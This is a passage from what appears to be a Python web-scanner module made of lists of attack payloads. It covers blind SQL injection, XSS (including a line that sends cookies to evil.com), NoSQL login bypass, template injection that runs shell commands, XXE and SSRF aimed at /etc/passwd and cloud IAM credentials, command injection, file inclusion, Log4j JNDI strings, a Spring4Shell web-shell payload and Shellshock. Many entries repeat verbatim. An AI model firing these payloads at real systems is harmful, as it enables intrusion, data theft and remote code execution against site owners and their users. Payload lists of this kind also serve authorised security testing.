    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='u' AND '1'='2';#",
    "' AND IF(ASCII(SUBSTRING(user(),1,1))>64,SLEEP(5),0)--",
    "' AND IF(ASCII(SUBSTRING(user(),1,1))>64,SLEEP(5),0)#",
    "' AND IF(ASCII(SUBSTRING(user(),1,1))>64,SLEEP(5),0)-- -",
    "' AND IF(ASCII(SUBSTRING(user(),1,1))>64,SLEEP(5),0);--",
    "' AND IF(ASCII(SUBSTRING(user(),1,1))>64,SLEEP(5),0);#",
    "' AND IF(ASCII(SUBSTRING(user(),1,1))=114,SLEEP(5),0)--",
    "' AND IF(ASCII(SUBSTRING(user(),1,1))=114,SLEEP(5),0)#",
    "' AND IF(ASCII(SUBSTRING(user(),1,1))=114,SLEEP(5),0)-- -",
    "' AND IF(ASCII(SUBSTRING(user(),1,1))=114,SLEEP(5),0);--",
    "' AND IF(ASCII(SUBSTRING(user(),1,1))=114,SLEEP(5),0);#",
    "' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>64,SLEEP(5),0)--",
    "' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>64,SLEEP(5),0)#",
    "' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>64,SLEEP(5),0)-- -",
    "' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>64,SLEEP(5),0);--",
    "' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>64,SLEEP(5),0);#",
    "' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=116,SLEEP(5),0)--",
    "' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=116,SLEEP(5),0)#",
    "' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=116,SLEEP(5),0)-- -",
    "' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=116,SLEEP(5),0);--",
    "' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=116,SLEEP(5),0);#",
    "' AND IF(LENGTH(database())>5,SLEEP(5),0)--","' AND IF(LENGTH(database())>5,SLEEP(5),0)#",
    "' AND IF(LENGTH(database())>5,SLEEP(5),0)-- -","' AND IF(LENGTH(database())>5,SLEEP(5),0);--",
    "' AND IF(LENGTH(database())>5,SLEEP(5),0);#","' AND IF(LENGTH(database())=6,SLEEP(5),0)--",
    "' AND IF(LENGTH(database())=6,SLEEP(5),0)#","' AND IF(LENGTH(database())=6,SLEEP(5),0)-- -",
    "' AND IF(LENGTH(database())=6,SLEEP(5),0);--","' AND IF(LENGTH(database())=6,SLEEP(5),0);#",
]

PAYLOADS_XSS = [
    "';alert(1)//","';document.location='http://evil.com'//","\\';alert(1)//",
    "';eval(String.fromCharCode(97,108,101,114,116,40,49,41))//","1;alert(1)","1);alert(1);//",
    "'+alert(1)+'",'"+(alert(1))+ "',"</script><script>alert(1)</script>","javascript:alert(1)",
    "';fetch('http://evil.com?c='+document.cookie)//","';new Function('alert(1)')()//","${alert(1)}",
    "#{alert(1)}","{{constructor.constructor('alert(1)')()}}",'"><img src=x onerror=alert(1)>',
    "'><svg onload=alert(1)>",'" autofocus onfocus=alert(1) x="',"' accesskey=x onclick=alert(1) x='",
    '<iframe srcdoc="<script>alert(1)</script>">','data:text/html,<script>alert(1)</script>',
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
    '<img src=x onerror="javascript:alert(\'XSS\')">','<svg onload="javascript:alert(\'XSS\')">',
    '<iframe src="data:text/html,<script>alert(\'XSS\')</script>"></iframe>',
    '<object data="data:text/html,<script>alert(\'XSS\')</script>"></object>',
    '<embed src="data:text/html,<script>alert(\'XSS\')</script>">',
    '<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(\'XSS\')</script>">',
    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
    '<a href="javascript:alert(\'XSS\')">Click me</a>',
    '<div onmouseover="javascript:alert(\'XSS\')">Hover me</div>',
    '<input type="text" onfocus="javascript:alert(\'XSS\')">',
    '<body onload=alert(1)>','<details open ontoggle=alert(1)>',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>','<marquee onstart=alert(1)>',
    '<img src=x onerror=alert(1)>','<svg/onload=alert(1)>',
    '<iframe srcdoc="<script>alert(1)</script>">',
    '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
    '{{constructor.constructor(\'alert(1)\')()}}','{{$eval.constructor(\'alert(1)\')()}}',
    '{{\'a\'.constructor.prototype.charAt=[].join;$eval(\'x=alert(1)\');}}',
    '{{_c.constructor(\'alert(1)\')()}}',
    '<script>window.parent.postMessage(\'xss\',\'*\')</script>',
    '<script>window.opener.postMessage({cmd:\'exec\',payload:\'alert(1)\'},\'*\')</script>',
    '<a id="config"></a><a id="config" name="url" href="javascript:alert(1)">',
    '<form id="config"><input name="action" value="javascript:alert(1)"></form>',
    '<img name="getElementById"><img name="body">',
    '"><img src=x onerror=alert(1) x="','"><svg/onload=alert(1) x="','"><body onload=alert(1) x="',
    '"><details open ontoggle=alert(1) x="','"><svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '"><marquee onstart=alert(1) x="','\'><img src=x onerror=alert(1)>\'',
    '\'><svg onload=alert(1)>\'','\'><body onload=alert(1)>\'','\'><details open ontoggle=alert(1)>\'',
    '\'><svg><animate onbegin=alert(1) attributeName=x dur=1s>\'','\'><marquee onstart=alert(1)>\'',
    '<img src=x onerror=alert(1)//','<svg onload=alert(1)//','<body onload=alert(1)//',
    '<details open ontoggle=alert(1)//','<svg><animate onbegin=alert(1) attributeName=x dur=1s>//',
    '<marquee onstart=alert(1)//','<img/src=x onerror=alert(1)>','<svg/onload=alert(1)>',
    '<body/onload=alert(1)>','<details/open/ontoggle=alert(1)>',
    '<svg><animate/onbegin=alert(1) attributeName=x dur=1s>','<marquee/onstart=alert(1)>',
    '<img src=x onerror=alert(1)>//','<svg onload=alert(1)>//','<body onload=alert(1)>//',
    '<details open ontoggle=alert(1)>//','<svg><animate onbegin=alert(1) attributeName=x dur=1s>//',
    '<marquee onstart=alert(1)>//','<IMG SRC=x ONERROR=alert(1)>','<SVG/ONLOAD=alert(1)>',
    '<BODY/ONLOAD=alert(1)>','<DETAILS/OPEN/ONTOGGLE=alert(1)>',
    '<SVG><ANIMATE/ONBEGIN=alert(1) attributeName=x dur=1s>','<MARQUEE/ONSTART=alert(1)>',
    '<img src=x onerror=alert(1)>','<svg onload=alert(1)>','<body onload=alert(1)>',
    '<details open ontoggle=alert(1)>','<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<marquee onstart=alert(1)>','<img src=x onerror=alert(1)>',
]

PAYLOADS_NOSQL = [
    '{"$ne":null}','{"$gt":""}','{"$regex":".*"}','{"$ne":""}','{"$exists":true}',
    '{"username":{"$ne":null},"password":{"$ne":null}}',
    '{"username":{"$regex":"^a"},"password":{"$ne":""}}',
    '{"$or":[{"username":"admin"},{"password":{"$ne":null}}]}',"' || '1'=='1","'; return true; //",
    '{"$where":"this.password == this.password"}','{"username":"admin","password":{"$regex":"^a"}}',
    '{"$where":"sleep(5000)"}','{"$where":"function(){sleep(5000);return true}"}',
    '{"$or":[{"username":"admin"},{"password":{"$ne":null}}]}','{"$or":[{"username":"admin"},{"password":{"$gt":""}}]}',
    '{"$or":[{"username":"admin"},{"password":{"$regex":".*"}}]}','{"$or":[{"username":"admin"},{"password":{"$ne":""}}]}',
    '{"$or":[{"username":"admin"},{"password":{"$exists":true}}]}',
    '{"$or":[{"username":"admin"},{"password":{"$ne":null}}],"$comment":"apexora"}',
    '{"$or":[{"username":"admin"},{"password":{"$gt":""}}],"$comment":"apexora"}',
    '{"$or":[{"username":"admin"},{"password":{"$regex":".*"}}],"$comment":"apexora"}',
    '{"$or":[{"username":"admin"},{"password":{"$ne":""}}],"$comment":"apexora"}',
    '{"$or":[{"username":"admin"},{"password":{"$exists":true}}],"$comment":"apexora"}',
    '{"username":{"$ne":null},"password":{"$ne":null},"$comment":"apexora"}',
    '{"username":{"$regex":"^a"},"password":{"$ne":""},"$comment":"apexora"}',
    '{"$or":[{"username":"admin"},{"password":{"$ne":null}}],"$comment":"apexora"}',
    '{"$where":"this.password == this.password","$comment":"apexora"}',
    '{"username":"admin","password":{"$regex":"^a"},"$comment":"apexora"}',
    '{"$where":"sleep(5000)","$comment":"apexora"}',
    '{"$where":"function(){sleep(5000);return true}","$comment":"apexora"}',
    '{"$or":[{"username":"admin"},{"password":{"$ne":null}}]}','{"$or":[{"username":"admin"},{"password":{"$gt":""}}]}',
    '{"$or":[{"username":"admin"},{"password":{"$regex":".*"}}]}','{"$or":[{"username":"admin"},{"password":{"$ne":""}}]}',
    '{"$or":[{"username":"admin"},{"password":{"$exists":true}}]}',
    '{"$or":[{"username":"admin"},{"password":{"$ne":null}}],"$comment":"apexora"}',
    '{"$or":[{"username":"admin"},{"password":{"$gt":""}}],"$comment":"apexora"}',
    '{"$or":[{"username":"admin"},{"password":{"$regex":".*"}}],"$comment":"apexora"}',
    '{"$or":[{"username":"admin"},{"password":{"$ne":""}}],"$comment":"apexora"}',
    '{"$or":[{"username":"admin"},{"password":{"$exists":true}}],"$comment":"apexora"}',
    '{"username":{"$ne":null},"password":{"$ne":null},"$comment":"apexora"}',
    '{"username":{"$regex":"^a"},"password":{"$ne":""},"$comment":"apexora"}',
    '{"$or":[{"username":"admin"},{"password":{"$ne":null}}],"$comment":"apexora"}',
    '{"$where":"this.password == this.password","$comment":"apexora"}',
    '{"username":"admin","password":{"$regex":"^a"},"$comment":"apexora"}',
    '{"$where":"sleep(5000)","$comment":"apexora"}',
    '{"$where":"function(){sleep(5000);return true}","$comment":"apexora"}',
    '{"username":{"$ne":null},"password":{"$ne":null},"$where":"1==1"}',
    '{"username":{"$regex":"^a"},"password":{"$ne":""},"$where":"1==1"}',
    '{"$or":[{"username":"admin"},{"password":{"$ne":null}}],"$where":"1==1"}',
    '{"$where":"this.password == this.password","$where2":"1==1"}',
    '{"username":"admin","password":{"$regex":"^a"},"$where":"1==1"}',
    '{"$where":"sleep(5000)","$where2":"1==1"}',
    '{"$where":"function(){sleep(5000);return true}","$where2":"1==1"}',
]

PAYLOADS_SSTI = {
    "webpy-0.76": [
        "${{__import__('os').popen('id').read()}}","${self.__init__.__globals__['os'].popen('id').read()}",
        "${{__import__('os').popen('id').read()}}","${self.__init__.__globals__['os'].popen('id').read()}",
        "${{__import__('os').popen('id').read()}}","${self.__init__.__globals__['os'].popen('id').read()}",
        "${{__import__('os').popen('id').read()}}","${self.__init__.__globals__['os'].popen('id').read()}",
        "${{__import__('os').popen('id').read()}}","${self.__init__.__globals__['os'].popen('id').read()}",
        "${{__import__('os').popen('id').read()}}","${self.__init__.__globals__['os'].popen('id').read()}",
    ],
    "litellm-1.82.4": [
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
    ],
    "jinja2-sandbox": [
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    ],
    "twig": [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    ],
    "freemarker": [
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    ],
    "generic": [
        "{{7*7}}","${7*7}","#{7*7}","<%= 7*7 %>","@(7*7)","{{config}}","{{self.__class__.__mro__}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{7*7}}","${7*7}","#{7*7}","<%= 7*7 %>","@(7*7)","{{config}}","{{self.__class__.__mro__}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{7*7}}","${7*7}","#{7*7}","<%= 7*7 %>","@(7*7)","{{config}}","{{self.__class__.__mro__}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{7*7}}","${7*7}","#{7*7}","<%= 7*7 %>","@(7*7)","{{config}}","{{self.__class__.__mro__}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
    ],
}

PAYLOADS_XXE = [
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///c:/windows/win.ini">]><x>&e;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "http://127.0.0.1:80/">]><x>&e;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><x>&e;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/hostname">]><x>&e;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "expect://id">]><x>&e;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % p SYSTEM "file:///etc/passwd"> %p;]><x>&e;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><x>&e;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///c:/windows/win.ini">]><x>&e;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "http://127.0.0.1:80/">]><x>&e;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><x>&e;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/hostname">]><x>&e;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "expect://id">]><x>&e;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % p SYSTEM "file:///etc/passwd"> %p;]><x>&e;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><x>&e;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///c:/windows/win.ini">]><x>&e;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "http://127.0.0.1:80/">]><x>&e;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><x>&e;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/hostname">]><x>&e;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "expect://id">]><x>&e;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % p SYSTEM "file:///etc/passwd"> %p;]><x>&e;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><x>&e;</x>',
]

PAYLOADS_SSRF = [
    "http://127.0.0.1/","http://127.0.0.1:22/","http://127.0.0.1:80/","http://localhost/","http://[::1]/",
    "http://0.0.0.0/","http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/","http://100.100.100.200/latest/meta-data/",
    "http://192.168.0.1/","http://10.0.0.1/","file:///etc/passwd","dict://127.0.0.1:22/",
    "gopher://127.0.0.1:6379/_INFO","http://2130706433/","http://0x7f.0.0.1/","http://127.1/",
    "http://[::ffff:127.0.0.1]/","http://0177.0.0.1/","http://127.0.0.1.nip.io/",
    "http://127.0.0.1/","http://127.0.0.1:22/","http://127.0.0.1:80/","http://localhost/","http://[::1]/",
    "http://0.0.0.0/","http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/","http://100.100.100.200/latest/meta-data/",
    "http://192.168.0.1/","http://10.0.0.1/","file:///etc/passwd","dict://127.0.0.1:22/",
    "gopher://127.0.0.1:6379/_INFO","http://2130706433/","http://0x7f.0.0.1/","http://127.1/",
    "http://[::ffff:127.0.0.1]/","http://0177.0.0.1/","http://127.0.0.1.nip.io/",
    "http://127.0.0.1/","http://127.0.0.1:22/","http://127.0.0.1:80/","http://localhost/","http://[::1]/",
    "http://0.0.0.0/","http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/","http://100.100.100.200/latest/meta-data/",
    "http://192.168.0.1/","http://10.0.0.1/","file:///etc/passwd","dict://127.0.0.1:22/",
    "gopher://127.0.0.1:6379/_INFO","http://2130706433/","http://0x7f.0.0.1/","http://127.1/",
    "http://[::ffff:127.0.0.1]/","http://0177.0.0.1/","http://127.0.0.1.nip.io/",
]

PAYLOADS_CMDI = [
    "; id","| id","|| id","& id","&& id","`id`","$(id)","%0aid","%0did","; ping -c1 127.0.0.1",
    "| ping -c1 127.0.0.1","& ping -n 1 127.0.0.1","; sleep 5","| sleep 5","& sleep 5","%3Bid","%7Cid",
    "1;id","1|id","$(sleep 5)","`sleep 5`","%0A id","${IFS}id","$IFS$9id","; whoami","| whoami",
    "$(whoami)","`whoami`","; id","| id","|| id","& id","&& id","`id`","$(id)","%0aid","%0did",
    "; ping -c1 127.0.0.1","| ping -c1 127.0.0.1","& ping -n 1 127.0.0.1","; sleep 5","| sleep 5",
    "& sleep 5","%3Bid","%7Cid","1;id","1|id","$(sleep 5)","`sleep 5`","%0A id","${IFS}id","$IFS$9id",
    "; whoami","| whoami","$(whoami)","`whoami`","; id","| id","|| id","& id","&& id","`id`","$(id)",
    "%0aid","%0did","; ping -c1 127.0.0.1","| ping -c1 127.0.0.1","& ping -n 1 127.0.0.1","; sleep 5",
    "| sleep 5","& sleep 5","%3Bid","%7Cid","1;id","1|id","$(sleep 5)","`sleep 5`","%0A id",
    "${IFS}id","$IFS$9id","; whoami","| whoami","$(whoami)","`whoami`","; id","| id","|| id","& id",
    "&& id","`id`","$(id)","%0aid","%0did","; ping -c1 127.0.0.1","| ping -c1 127.0.0.1",
    "& ping -n 1 127.0.0.1","; sleep 5","| sleep 5","& sleep 5","%3Bid","%7Cid","1;id","1|id",
    "$(sleep 5)","`sleep 5`","%0A id","${IFS}id","$IFS$9id","; whoami","| whoami","$(whoami)","`whoami`",
]

PAYLOADS_LFI = [
    "../../../../etc/passwd","....//....//....//....//etc/passwd","..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd","/etc/passwd%00",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=string.rot13/resource=/etc/passwd","file:///etc/passwd","expect://id",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+","zip:///tmp/shell.zip%23shell","phar:///tmp/shell.phar",
    "../../../../windows/win.ini","C:\\Windows\\win.ini","/proc/self/environ","/proc/self/cmdline",
    "/etc/shadow","/var/log/apache2/access.log","/var/log/nginx/access.log","/proc/self/maps",
    "../../../../etc/passwd","....//....//....//....//etc/passwd","..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd","/etc/passwd%00",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=string.rot13/resource=/etc/passwd","file:///etc/passwd","expect://id",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+","zip:///tmp/shell.zip%23shell","phar:///tmp/shell.phar",
    "../../../../windows/win.ini","C:\\Windows\\win.ini","/proc/self/environ","/proc/self/cmdline",
    "/etc/shadow","/var/log/apache2/access.log","/var/log/nginx/access.log","/proc/self/maps",
    "../../../../etc/passwd","....//....//....//....//etc/passwd","..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd","/etc/passwd%00",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=string.rot13/resource=/etc/passwd","file:///etc/passwd","expect://id",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+","zip:///tmp/shell.zip%23shell","phar:///tmp/shell.phar",
    "../../../../windows/win.ini","C:\\Windows\\win.ini","/proc/self/environ","/proc/self/cmdline",
    "/etc/shadow","/var/log/apache2/access.log","/var/log/nginx/access.log","/proc/self/maps",
]

PAYLOADS_JWT = [
    '{"alg":"none","typ":"JWT"}','{"alg":"HS256","kid":"../../etc/passwd"}','{"alg":"RS256","typ":"JWT"}',
    '{"alg":"ES256","typ":"JWT"}','{"alg":"none","typ":"JWT"}','{"alg":"HS256","kid":"../../etc/passwd"}',
    '{"alg":"RS256","typ":"JWT"}','{"alg":"ES256","typ":"JWT"}','{"alg":"none","typ":"JWT"}',
    '{"alg":"HS256","kid":"../../etc/passwd"}','{"alg":"RS256","typ":"JWT"}','{"alg":"ES256","typ":"JWT"}',
]

PAYLOADS_OAUTH = [
    "redirect_uri=https://evil.com","redirect_uri=https://legit.com@evil.com",
    "redirect_uri=https://legit.com.evil.com","redirect_uri=//evil.com","scope=admin+write","state=",
    "redirect_uri=https://evil.com","redirect_uri=https://legit.com@evil.com",
    "redirect_uri=https://legit.com.evil.com","redirect_uri=//evil.com","scope=admin+write","state=",
    "redirect_uri=https://evil.com","redirect_uri=https://legit.com@evil.com",
    "redirect_uri=https://legit.com.evil.com","redirect_uri=//evil.com","scope=admin+write","state=",
]

PAYLOADS_GRAPHQL = [
    "{__schema{types{name}}}",'{__type(name:"User"){fields{name}}}',"query{user(id:1){password}}",
    "mutation{deleteUser(id:1)}","{__schema{types{name}}}",'{__type(name:"User"){fields{name}}}',
    "query{user(id:1){password}}","mutation{deleteUser(id:1)}","{__schema{types{name}}}",
    '{__type(name:"User"){fields{name}}}',"query{user(id:1){password}}","mutation{deleteUser(id:1)}",
]

PAYLOADS_DESER = {
    "java": ["rO0ABXNyACJqYXZhLnV0aWwuSGFzaE1hcA=="],
    "php": ['O:8:"stdClass":0:{}'],
    "python": ["gASVAAAAAAAA"],
    "dotnet": ["AAEAAAD/////AQAAAAAAAAAMAgAAAFRTeXN0ZW0="],
}

PAYLOADS_PROTO = [
    "__proto__[admin]=true","constructor[prototype][admin]=true",'{"__proto__":{"admin":true}}',
    "?__proto__[polluted]=yes","?constructor[prototype][polluted]=yes","__proto__[admin]=true",
    "constructor[prototype][admin]=true",'{"__proto__":{"admin":true}}',"?__proto__[polluted]=yes",
    "?constructor[prototype][polluted]=yes","__proto__[admin]=true","constructor[prototype][admin]=true",
]

PAYLOADS_LOG4J = [
    "${jndi:ldap://COLLAB/test}","${jndi:rmi://COLLAB/test}","${jndi:dns://COLLAB/test}",
    "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://COLLAB/test}",
    "${jndi:ldap://COLLAB/test}","${jndi:rmi://COLLAB/test}","${jndi:dns://COLLAB/test}",
    "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://COLLAB/test}",
    "${jndi:ldap://COLLAB/test}","${jndi:rmi://COLLAB/test}","${jndi:dns://COLLAB/test}",
    "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://COLLAB/test}",
]

PAYLOADS_SPRING = [
    'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20=%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20=%20-1%3B%20byte%5B%5D%20b%20=%20new%20byte%5B2048%5D%3B%20while((a=in.read(b))!=-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di',
    'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20=%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20=%20-1%3B%20byte%5B%5D%20b%20=%20new%20byte%5B2048%5D%3B%20while((a=in.read(b))!=-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di',
    'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20=%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20=%20-1%3B%20byte%5B%5D%20b%20=%20new%20byte%5B2048%5D%3B%20while((a=in.read(b))!=-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di',
]

PAYLOADS_SHELLSHOCK = [
    "() { :;}; echo; /bin/bash -c 'id'","() { :;}; /bin/bash -c 'sleep 5'",
    "() { _; } >_[$($())] { echo vulnerable; }","() { :;}; echo; /bin/bash -c 'id'",
    "() { :;}; /bin/bash -c 'sleep 5'","() { _; } >_[$($())] { echo vulnerable; }",
    "() { :;}; echo; /bin/bash -c 'id'","() { :;}; /bin/bash -c 'sleep 5'",
    "() { _; } >_[$($())] { echo vulnerable; }",
]

PAYLOADS_CRLF = [
    "%0d%0aSet-Cookie:evil=1","%0aSet-Cookie:evil=1","test\r\nX-Injected: 1","test\nSet-Cookie: hacked=yes",
    "%0d%0aSet-Cookie:evil=1","%0aSet-Cookie:evil=1","test\r\nX-Injected: 1","test\nSet-Cookie: hacked=yes",
    "%0d%0aSet-Cookie:evil=1","%0aSet-Cookie:evil=1","test\r\nX-Injected: 1","test\nSet-Cookie: hacked=yes",
]

PAYLOADS_HPP = [
    "?id=1&id=2","?id=1&id=' OR 1=1--","?id[]=1&id[]=2","?id=1&id=2","?id=1&id=' OR 1=1--","?id[]=1&id[]=2",
    "?id=1&id=2","?id=1&id=' OR 1=1--","?id[]=1&id[]=2","?id=1&id=2","?id=1&id=' OR 1=1--","?id[]=1&id[]=2",
]

PAYLOADS_CORS = [
    "https://evil.com","null","https://legit.com.evil.com","https://evil.com","null","https://legit.com.evil.com",
    "https://evil.com","null","https://legit.com.evil.com","https://evil.com","null","https://legit.com.evil.com",
]

PAYLOADS_UPLOAD = [
    "shell.php","shell.php.jpg","shell.pHp","shell.php%00.jpg","shell.phtml","shell.phar",".htaccess",
